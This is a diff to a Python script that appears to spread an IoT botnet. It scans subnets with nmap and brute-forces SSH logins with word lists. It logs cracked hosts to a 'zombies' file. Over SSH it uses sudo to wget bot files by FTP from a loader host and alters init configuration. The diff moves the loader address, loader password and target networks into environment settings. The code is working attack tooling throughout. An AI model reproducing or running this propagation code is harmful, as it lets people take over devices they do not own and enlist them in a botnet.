@@ -2,9 +2,11 @@ from queue import Queue
 from threading import Thread
 import nmap
 import paramiko
-
-import BotNet
 from threadSafePrint import threadSafePrint, bcolors
+
+from Env import Env
+
+env = Env()
 
 scanner_t1 = nmap.PortScanner()
 scanner_t2 = nmap.PortScanner()
@@ -20,6 +22,9 @@ def openFile(path, action='w'):
 def sshLogin(user, ip, password):
     threadSafePrint(bcolors.BOLD, bcolors.HEADER, "Starting ssh login thread for ", ip, bcolors.ENDC)
     try:
+        loaderIp = str(env.get(key="loaderIp"))
+        loaderPassword = str(env.get(key="loaderPassword"))
+
         p = paramiko.SSHClient()
         p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         p.connect(ip, port=22, username=user, password=password)
@@ -40,7 +45,7 @@ def sshLogin(user, ip, password):
         cd kabali 
         echo ''' + password + '''| sudo -S mkdir IotBot
         cd IotBot
-        echo ''' + password + '''| sudo -S wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
+        echo ''' + password + '''| sudo -S wget --user=user --password=''' + loaderPassword + ''' ftp://''' + loaderIp + ''':/IotBot/*
         
         echo ''' + password + '''| sudo stop my
         echo ''' + password + '''| sudo -S echo exec [[ -d /etc/init/my.conf ]] && sudo -S rm -r /etc/init/my.conf
@@ -70,7 +75,8 @@ def ssh(ip):
                     " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip, bcolors.ENDC)
     zombies = openFile('zombies.txt', 'a')
 
-    scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt')
+    scanner_t2.scan(hosts=ip, ports='22',
+                    arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt')
 
     if scanner_t2[ip].state() == 'up':
         protocols = scanner_t2[ip].all_protocols()
@@ -145,12 +151,15 @@ def attack(q):
 
 
 if __name__ == '__main__':
-    # b = BotNet.BotNet(networks=["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"])
-    network = ["10.1.0.0/24", "10.2.0.0/24", "10.3.0.0/24", "10.4.0.0/24"]
+    network = env.get(key="network")
 
     q = Queue()
     t1 = Thread(target=scan, args=(q, network))
     t2 = Thread(target=attack, args=(q,))
-    t1.start()
-    t2.start()
-    # sshLogin("root", "10.1.0.114", "abcd")
+    try:
+        t1.start()
+        t2.start()
+    except KeyboardInterrupt:
+        print("Press Ctrl-C to terminate while statement")
+        t1.join()
+        t2.join()
